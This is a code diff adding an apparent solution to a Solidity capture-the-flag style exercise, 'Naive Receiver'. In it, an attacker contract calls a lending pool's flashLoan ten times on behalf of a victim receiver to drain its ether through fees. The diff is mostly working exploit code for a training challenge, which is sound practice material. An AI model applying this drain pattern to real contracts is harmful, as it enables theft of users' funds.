@@ -49,6 +49,11 @@ contract NaiveReceiver is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        Exploiter exploiter = new Exploiter(
+            naiveReceiverLenderPool,
+            address(flashLoanReceiver)
+        );
 
         /** EXPLOIT END **/
         validation();
@@ -61,5 +66,13 @@ contract NaiveReceiver is Test {
             address(naiveReceiverLenderPool).balance,
             ETHER_IN_POOL + ETHER_IN_RECEIVER
         );
+    }
+}
+
+contract Exploiter {
+    constructor(NaiveReceiverLenderPool pool, address receiver) {
+        for (uint256 i = 0; i < 10; ++i) {
+            pool.flashLoan(address(receiver), 0);
+        }
     }
 }
